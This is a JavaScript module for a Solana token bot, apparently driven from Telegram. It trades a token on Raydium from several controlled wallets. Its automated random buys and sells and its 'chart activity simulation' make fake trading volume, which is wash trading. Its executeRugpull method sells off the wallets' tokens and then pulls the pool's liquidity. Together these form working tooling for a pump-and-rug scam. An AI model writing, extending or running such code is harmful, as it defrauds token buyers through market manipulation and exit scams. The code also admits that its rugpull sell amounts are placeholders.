class RealTradingManager {
    constructor(walletManager, tokenManager, raydiumManager) {
        this.walletManager = walletManager;
        this.tokenManager = tokenManager;
        this.raydiumManager = raydiumManager;
        
        // Trading state
        this.isTrading = false;
        this.tradingInterval = null;
        this.chartActivityInterval = null; // For periodic small trades
        this.currentToken = null;
        this.tradingStats = {
            totalTrades: 0,
            buyTrades: 0,
            sellTrades: 0,
            successfulTrades: 0,
            failedTrades: 0,
            startTime: null,
            lastTradeTime: null
        };
    }

    // Generate random trade parameters for real trading
    async generateRandomTrade() {
        // 70% buy, 30% sell
        const isBuy = Math.random() < 0.7;
        
        // Use wallets 2-5 (walletId 2-5, since wallet 1 is for pool operations)
        const availableWallets = [2, 3, 4, 5];
        const walletId = availableWallets[Math.floor(Math.random() * availableWallets.length)];
        
        if (isBuy) {
            // Random SOL amount between 0.01 and 0.05 for real trading
            const solAmount = 0.01 + Math.random() * 0.04;
            return {
                type: 'BUY',
                walletId,
                amount: solAmount
            };
        } else {
            // For sells, check if wallet actually has tokens first
            try {
                const tokenBalance = await this.getTokenBalance(this.currentToken, walletId);
                
                if (tokenBalance <= 0) {
                    // If no tokens to sell, make it a buy instead
                    console.log(`⚠️ Wallet ${walletId} has no tokens (${tokenBalance}), switching to BUY`);
                    const solAmount = 0.01 + Math.random() * 0.04;
                    return {
                        type: 'BUY',
                        walletId,
                        amount: solAmount
                    };
                }
                
                // Sell 10-50% of token balance
                const sellPercentage = 0.1 + Math.random() * 0.4;
                const tokenAmount = tokenBalance * sellPercentage;
                
                return {
                    type: 'SELL',
                    walletId,
                    amount: tokenAmount
                };
            } catch (error) {
                console.error(`❌ Error checking token balance for wallet ${walletId}:`, error);
                // Fallback to buy if we can't check balance
                const solAmount = 0.01 + Math.random() * 0.04;
                return {
                    type: 'BUY',
                    walletId,
                    amount: solAmount
                };
            }
        }
    }

    // Get actual token balance for a wallet
    async getTokenBalance(tokenMint, walletId) {
        return await this.raydiumManager.getTokenBalance(tokenMint, walletId);
    }

    // Execute a real trade using Raydium
    async executeTrade(tradeParams) {
        if (!this.currentToken) {
            return {
                success: false,
                error: 'No token selected for trading'
            };
        }

        let result;
        try {
            if (tradeParams.type === 'BUY') {
                result = await this.raydiumManager.executeBuySwap(
                    this.currentToken, 
                    tradeParams.amount, 
                    tradeParams.walletId
                );
            } else {
                // For sell, use the amount directly (already calculated with balance check)
                result = await this.raydiumManager.executeSellSwap(
                    this.currentToken, 
                    tradeParams.amount, 
                    tradeParams.walletId
                );
            }

            if (result.success) {
                // Update trading stats
                this.tradingStats.totalTrades++;
                this.tradingStats.successfulTrades++;
                if (result.type === 'BUY') {
                    this.tradingStats.buyTrades++;
                } else {
                    this.tradingStats.sellTrades++;
                }
                this.tradingStats.lastTradeTime = new Date();
            } else {
                this.tradingStats.totalTrades++;
                this.tradingStats.failedTrades++;
            }

            return result;

        } catch (error) {
            console.error('❌ Trade execution error:', error);
            this.tradingStats.totalTrades++;
            this.tradingStats.failedTrades++;
            
            return {
                success: false,
                error: error.message || 'Trade execution failed'
            };
        }
    }

    // Start real automated trading
    startTrading(tokenMint, onTradeCallback) {
        if (this.isTrading) {
            return {
                success: false,
                error: 'Trading is already active'
            };
        }

        // Check if pool exists for this token
        if (!this.raydiumManager.hasPool(tokenMint)) {
            return {
                success: false,
                error: 'No pool found for this token. Create pool first with /create_pool'
            };
        }

        this.currentToken = tokenMint;
        this.isTrading = true;
        this.tradingStats.startTime = new Date();
        this.tradingStats.totalTrades = 0;
        this.tradingStats.buyTrades = 0;
        this.tradingStats.sellTrades = 0;
        this.tradingStats.successfulTrades = 0;
        this.tradingStats.failedTrades = 0;

        const executeTradingLoop = async () => {
            if (!this.isTrading) {
                return;
            }

            try {
                // Generate and execute random trade (now with balance checking)
                const tradeParams = await this.generateRandomTrade();
                const result = await this.executeTrade(tradeParams);

                // Call the callback with trade result
                if (onTradeCallback) {
                    onTradeCallback(result);
                }

            } catch (error) {
                console.error('❌ Trading loop error:', error);
                if (onTradeCallback) {
                    onTradeCallback({
                        success: false,
                        error: error.message || 'Trading loop error'
                    });
                }
            }

            // Schedule next trade with random delay (30-90 seconds as requested)
            if (this.isTrading) {
                const nextDelay = (30 + Math.random() * 60) * 1000; // 30-90 seconds in milliseconds
                this.tradingInterval = setTimeout(executeTradingLoop, nextDelay);
            }
        };

        // Start the first trade with initial delay
        const initialDelay = (5 + Math.random() * 10) * 1000; // 5-15 seconds initial delay
        this.tradingInterval = setTimeout(executeTradingLoop, initialDelay);

        return {
            success: true,
            message: 'Real automated trading started'
        };
    }

    // Stop automated trading
    stopTrading() {
        if (!this.isTrading) {
            return {
                success: false,
                error: 'Trading is not active'
            };
        }

        this.isTrading = false;
        if (this.tradingInterval) {
            clearTimeout(this.tradingInterval);
            this.tradingInterval = null;
        }
        
        // Also stop chart activity if running
        if (this.chartActivityInterval) {
            clearInterval(this.chartActivityInterval);
            this.chartActivityInterval = null;
        }

        return {
            success: true,
            stats: { ...this.tradingStats }
        };
    }

    // Execute rugpull - sell all tokens from all wallets and remove liquidity
    async executeRugpull(tokenMint) {
        console.log(`🔴 Starting rugpull for ${tokenMint}...`);

        const tokenInfo = this.tokenManager.getToken(tokenMint);
        if (!tokenInfo) {
            throw new Error('Token not found');
        }

        const rugpullResults = {
            tokensSold: 0,
            solRecovered: 0,
            liquidityRemoved: false,
            liquiditySOL: 0,
            liquidityTokens: 0,
            tradingWalletResults: [],
            liquidityResult: null
        };

        try {
            // Step 1: Sell all tokens from trading wallets (2-5)
            console.log('🔴 Step 1: Selling tokens from trading wallets...');
            
            for (let walletId = 2; walletId <= 5; walletId++) {
                try {
                    // Try to sell a reasonable amount (this is simplified)
                    // In real implementation, would check actual token balance first
                    const sellAmount = 50 + Math.random() * 100; // 50-150 tokens
                    
                    const sellResult = await this.raydiumManager.executeSellSwap(
                        tokenMint, 
                        sellAmount, 
                        walletId
                    );

                    if (sellResult.success) {
                        rugpullResults.tokensSold += sellResult.tokensSold;
                        rugpullResults.solRecovered += sellResult.solReceived;
                        rugpullResults.tradingWalletResults.push(sellResult);
                        console.log(`✅ Sold ${sellResult.tokensSold} tokens from wallet ${walletId}`);
                    } else {
                        console.log(`⚠️ Failed to sell from wallet ${walletId}: ${sellResult.error}`);
                    }
                } catch (error) {
                    console.log(`⚠️ Error selling from wallet ${walletId}: ${error.message}`);
                }
            }

            // Step 2: Remove liquidity from pool using wallet 1
            console.log('🔴 Step 2: Removing liquidity from pool...');
            
            try {
                const liquidityResult = await this.raydiumManager.rugpullPool(tokenMint);
                
                if (liquidityResult.success) {
                    rugpullResults.liquidityRemoved = true;
                    rugpullResults.liquiditySOL = liquidityResult.recoveredSOL;
                    rugpullResults.liquidityTokens = liquidityResult.recoveredTokens;
                    rugpullResults.liquidityResult = liquidityResult;
                    console.log(`✅ Removed liquidity: ${liquidityResult.recoveredSOL} SOL, ${liquidityResult.recoveredTokens} tokens`);
                } else {
                    console.log('⚠️ Failed to remove liquidity from pool');
                }
            } catch (error) {
                console.log(`⚠️ Error removing liquidity: ${error.message}`);
            }

            // Calculate total recovery
            const totalSOLRecovered = rugpullResults.solRecovered + rugpullResults.liquiditySOL;

            console.log(`🎯 Rugpull complete: ${totalSOLRecovered.toFixed(4)} SOL recovered`);

            return {
                success: true,
                totalTokensSold: rugpullResults.tokensSold,
                totalSOLRecovered: totalSOLRecovered,
                liquidityRemoved: rugpullResults.liquidityRemoved,
                tradingWalletSales: rugpullResults.tradingWalletResults.length,
                details: rugpullResults
            };

        } catch (error) {
            console.error('❌ Rugpull failed:', error);
            throw error;
        }
    }

    // Get current trading status
    getTradingStatus() {
        return {
            isTrading: this.isTrading,
            currentToken: this.currentToken,
            stats: { ...this.tradingStats }
        };
    }

    // Format trade result for Telegram (delegates to RaydiumManager)
    formatTradeForTelegram(tradeResult) {
        return this.raydiumManager.formatTradeForTelegram(tradeResult);
    }

    // Start chart activity simulation - periodic small trades
    startChartActivity(tokenMint, intervalMinutes = 10) {
        if (this.chartActivityInterval) {
            clearInterval(this.chartActivityInterval);
        }

        console.log(`📈 Starting chart activity simulation for ${tokenMint} (every ${intervalMinutes}m)`);
        
        this.currentToken = tokenMint;
        
        // Execute first trade immediately
        this.executeChartActivityTrade();
        
        // Then schedule periodic trades
        this.chartActivityInterval = setInterval(() => {
            this.executeChartActivityTrade();
        }, intervalMinutes * 60 * 1000); // Convert to milliseconds

        return {
            success: true,
            message: `Chart activity started - trades every ${intervalMinutes} minutes`
        };
    }

    // Execute a single chart activity trade (smaller amounts)
    async executeChartActivityTrade() {
        if (!this.currentToken) return;

        try {
            // Generate a very small trade for chart activity
            const trade = await this.generateChartActivityTrade();
            
            if (trade.type === 'BUY') {
                console.log(`📈 Chart activity BUY: ${trade.amount} SOL from wallet ${trade.walletId}`);
                
                const result = await this.raydiumManager.executeBuySwap(
                    this.currentToken,
                    trade.amount,
                    trade.walletId
                );

                if (result.success) {
                    console.log(`✅ Chart activity buy successful: ${result.tokensReceived} tokens`);
                } else {
                    console.log(`❌ Chart activity buy failed: ${result.error}`);
                }
            } else {
                console.log(`📈 Chart activity SELL: ${trade.amount} tokens from wallet ${trade.walletId}`);
                
                const result = await this.raydiumManager.executeSellSwap(
                    this.currentToken,
                    trade.amount,
                    trade.walletId
                );

                if (result.success) {
                    console.log(`✅ Chart activity sell successful: ${result.solReceived} SOL`);
                } else {
                    console.log(`❌ Chart activity sell failed: ${result.error}`);
                }
            }
        } catch (error) {
            console.error(`❌ Chart activity trade error: ${error.message}`);
        }
    }

    // Generate small random trade for chart activity (smaller than regular trading)
    async generateChartActivityTrade() {
        // 60% buy, 40% sell for more chart activity
        const isBuy = Math.random() < 0.6;
        
        // Use wallets 2-5
        const availableWallets = [2, 3, 4, 5];
        const walletId = availableWallets[Math.floor(Math.random() * availableWallets.length)];
        
        if (isBuy) {
            // Very small SOL amounts for chart activity: 0.005 to 0.02 SOL
            const solAmount = 0.005 + Math.random() * 0.015;
            return {
                type: 'BUY',
                walletId,
                amount: solAmount
            };
        } else {
            // Check if wallet has tokens for selling
            try {
                const tokenBalance = await this.getTokenBalance(this.currentToken, walletId);
                
                if (tokenBalance <= 0) {
                    // No tokens, make it a small buy instead
                    const solAmount = 0.005 + Math.random() * 0.015;
                    return {
                        type: 'BUY',
                        walletId,
                        amount: solAmount
                    };
                }

                // Sell small percentage of balance: 5-15%
                const sellAmount = tokenBalance * (0.05 + Math.random() * 0.1);
                return {
                    type: 'SELL',
                    walletId,
                    amount: sellAmount
                };
            } catch (error) {
                // Error checking balance, default to small buy
                const solAmount = 0.005 + Math.random() * 0.015;
                return {
                    type: 'BUY',
                    walletId,
                    amount: solAmount
                };
            }
        }
    }

    // Stop chart activity simulation
    stopChartActivity() {
        if (this.chartActivityInterval) {
            clearInterval(this.chartActivityInterval);
            this.chartActivityInterval = null;
            console.log('📈 Chart activity simulation stopped');
            return {
                success: true,
                message: 'Chart activity simulation stopped'
            };
        }
        
        return {
            success: false,
            error: 'Chart activity is not running'
        };
    }

    // Get chart activity status
    getChartActivityStatus() {
        return {
            isActive: this.chartActivityInterval !== null,
            currentToken: this.currentToken
        };
    }
}

module.exports = RealTradingManager;